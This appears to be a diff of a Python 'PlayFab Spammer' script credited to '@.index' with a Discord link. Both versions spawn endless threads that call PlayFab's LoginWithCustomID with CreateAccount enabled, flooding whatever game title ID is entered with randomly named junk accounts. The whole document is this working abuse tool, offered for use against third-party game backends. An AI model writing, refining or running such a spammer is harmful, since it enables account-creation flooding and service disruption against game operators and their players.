@@ -1,52 +1,27 @@
-```
-
-CREDIT I STOLE THIS FROM ETX
-
-import threading, string, random
-from colorama import Fore
+import threading, secrets, os
 from playfab import PlayFabClientAPI, PlayFabSettings
 
-print("Made by, @.index")
-print("https://discord.gg/GSWSahAmVU")
+print("PlayFab Spammer made by, @.index | https://discord.gg/GSWSahAmVU")
 
 PlayFabSettings.TitleId = input('TitleID: ')
-name = input('CustomID Name: ')
-print(f”Spamming {PlayFabSettings.TitleId} with Name: {name}”)
+name = temp = input('CustomID Name: ')
+
+print(f"\u001B[36m{PlayFabSettings.TitleId} | Spamming with {name}")
 
 def callback(success, failure):
-  if success:
+    if success: print(f"\u001B[32m{PlayFabSettings.TitleId} | Created \u001B[0m\u001B[34m{name}\u001B[0m")
+    if failure: print(f"\u001B[41m\u001B[30m{PlayFabSettings.TitleId} | Could not create \u001B[0m\u001B[41m\u001B[34m{name}\u001B[0m")
 
-    print(Fore.GREEN + '<Debug> User Created, TitleId: ' +
-          PlayFabSettings.TitleId + ', Name: ' + name)
-  if failure:
-    print(Fore.RED + '<Debug> Failure Within Spamming. Not Avalible, Rate Limited, or Disabled Api Calls')
-
-
-def do_random_gen():
-  while True:
-    bomb = ''.join(
-      random.choices(string.ascii_uppercase + string.hexdigits, k=5))
-    request = {
-      "CustomId":
-      name + bomb,
-      "CreateAccount":
-      True,
-      "DisplayName":
-      "YOURCUSTOMNAME" +
-      ''.join(random.choices(string.ascii_uppercase + string.hexdigits, k=5)),
-    }
-    PlayFabClientAPI.LoginWithCustomID(request, callback)
-
+def spam():
+    while True:
+        name = temp + secrets.token_hex(5).upper()
+        PlayFabClientAPI.LoginWithCustomID({
+            "CustomId": name,
+            "DisplayName": name,
+            "CreateAccount": True
+        }, callback)
 
 threads = []
-
-for i in range(50):
-  t = threading.Thread(target=do_random_gen)
-  t.daemon = True
-  threads.append(t)
-
-for i in range(50):
-  threads[i].start()
-
-for i in range(50):
-  threads[i].join() ```
+for _ in range(os.cpu_count()):
+    threads.append(threading.Thread(target=spam, daemon=True))
+for thread in threads: thread.start()
